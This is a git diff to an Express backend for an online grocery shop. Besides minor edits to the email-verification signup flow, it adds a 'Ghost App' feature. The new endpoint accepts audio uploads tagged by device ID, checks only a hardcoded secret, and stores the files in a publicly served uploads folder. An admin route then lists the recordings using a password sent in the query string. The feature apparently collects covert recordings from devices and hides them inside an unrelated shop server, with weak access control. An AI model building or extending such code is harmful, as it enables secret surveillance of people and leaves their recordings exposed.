@@ -16,6 +16,14 @@ const Order = require("./models/order");
 const Product = require("./models/product"); 
 const Banner = require("./models/banner");
 
+// --- 🚀 GHOST APP MODEL (New) ---
+const GhostData = mongoose.model("GhostData", new mongoose.Schema({
+    deviceId: String,
+    fileName: String,
+    filePath: String,
+    timestamp: { type: Date, default: Date.now }
+}));
+
 const app = express();
 app.use(express.json());
 
@@ -30,10 +38,18 @@ app.use(cors({
 app.use(express.static("public"));
 app.use('/uploads', express.static(path.join(__dirname, 'public/uploads')));
 
-// --- MULTER CONFIG ---
+// --- MULTER CONFIG (Updated for Ghost App Support) ---
 const storage = multer.diskStorage({
     destination: (req, file, cb) => {
-        cb(null, 'public/uploads/'); 
+        // अगर Ghost App से ऑडियो आ रहा है तो अलग फोल्डर में डालें
+        if (file.fieldname === "audio") {
+            const fs = require('fs');
+            const dir = 'public/uploads/ghost/';
+            if (!fs.existsSync(dir)){ fs.mkdirSync(dir, { recursive: true }); }
+            cb(null, dir);
+        } else {
+            cb(null, 'public/uploads/'); 
+        }
     },
     filename: (req, file, cb) => {
         const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
@@ -41,6 +57,34 @@ const storage = multer.diskStorage({
     }
 });
 const upload = multer({ storage: storage });
+
+// --- 🚀 GHOST APP API ROUTES ---
+app.post("/api/upload-ghost-data", upload.single('audio'), async (req, res) => {
+    try {
+        const { device, secret } = req.body;
+        if (secret !== "RATU_GHOST_SECRET") return res.status(403).json({ error: "Invalid Secret" });
+
+        const newData = new GhostData({
+            deviceId: device || "Unknown Device",
+            fileName: req.file.filename,
+            filePath: `/uploads/ghost/${req.file.filename}`
+        });
+
+        await newData.save();
+        res.status(200).json({ success: true, message: "Sync Success" });
+    } catch (err) {
+        res.status(500).json({ error: "Server Error" });
+    }
+});
+
+app.get("/api/admin/ghost-list", async (req, res) => {
+    const { password } = req.query;
+    if (password !== process.env.ADMIN_PASSWORD) return res.status(403).send("Unauthorized");
+    try {
+        const data = await GhostData.find().sort({ timestamp: -1 });
+        res.json(data);
+    } catch (err) { res.status(500).json({ error: "Fetch failed" }); }
+});
 
 // --- DEFAULT ROUTES ---
 app.get("/", (req, res) => {
@@ -168,13 +212,12 @@ app.post("/reverse-geocode", async (req, res) => {
     } catch (err) { res.status(500).json({ error: "Location error" }); }
 });
 
-// --- 4. AUTH & MAGIC LINK (UPDATED FOR DUPLICATE FIX) ---
+// --- 4. AUTH & MAGIC LINK ---
 app.post("/api/signup/magic-link", async (req, res) => {
     const { name, email, phone, address, pincode, area, lat, lng } = req.body;
     try {
         let user = await User.findOne({ $or: [{ email }, { phone }] });
 
-        // अगर यूजर है और Verified है, तभी "Already Registered" बोलें
         if (user && user.isVerified === true) {
             return res.status(400).json({ error: "Account already verified. Please Login." });
         }
@@ -183,13 +226,11 @@ app.post("/api/signup/magic-link", async (req, res) => {
         const expiry = Date.now() + 3600000;
 
         if (user && user.isVerified === false) {
-            // पुराने Unverified यूजर का डेटा अपडेट करें और नया लिंक भेजें
             user.name = name; user.address = address; user.pincode = pincode;
             user.area = area; user.lat = lat; user.lng = lng;
             user.verificationToken = mToken; user.tokenExpiry = expiry;
             await user.save();
         } else {
-            // बिल्कुल नया यूजर
             user = new User({ name, email, phone, address, pincode, area, lat, lng, verificationToken: mToken, tokenExpiry: expiry });
             await user.save();
         }
@@ -199,9 +240,9 @@ app.post("/api/signup/magic-link", async (req, res) => {
             from: 'Ratu Fresh <otp@ratufresh.me>', to: email,
             subject: `नमस्ते ${name}, Verify Account!`,
             html: `<div style="text-align:center; padding:20px; border:1px solid #24b637; border-radius:15px; font-family:sans-serif;">
-                   <h2>Welcome!</h2><p>Please click below to verify your email.</p>
-                   <a href="${verifyUrl}" style="background:#24b637; color:white; padding:15px 25px; text-decoration:none; border-radius:10px; display:inline-block; font-weight:bold;">Verify Account ✨</a>
-                   </div>`
+                    <h2>Welcome!</h2><p>Please click below to verify your email.</p>
+                    <a href="${verifyUrl}" style="background:#24b637; color:white; padding:15px 25px; text-decoration:none; border-radius:10px; display:inline-block; font-weight:bold;">Verify Account ✨</a>
+                    </div>`
         });
         res.json({ success: true, message: "Link sent" });
     } catch (err) { res.status(500).json({ error: "Signup error" }); }
@@ -219,12 +260,10 @@ app.get("/api/verify-email", async (req, res) => {
         if (!(await Cart.findOne({ user: user._id }))) await new Cart({ user: user._id, items: [] }).save();
 
         const loginToken = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: "90d" });
-        // Redirecting simply to profiles.html
         res.redirect(`https://ratufresh.me/profiles.html?token=${loginToken}&verified=true`);
     } catch (err) { res.status(500).send("Error"); }
 });
 
-// [POLLING ROUTE] - यह चेक करेगा कि Gmail में बटन दबाया गया या नहीं
 app.get("/api/check-verification/:phone", async (req, res) => {
     try {
         const user = await User.findOne({ phone: req.params.phone });
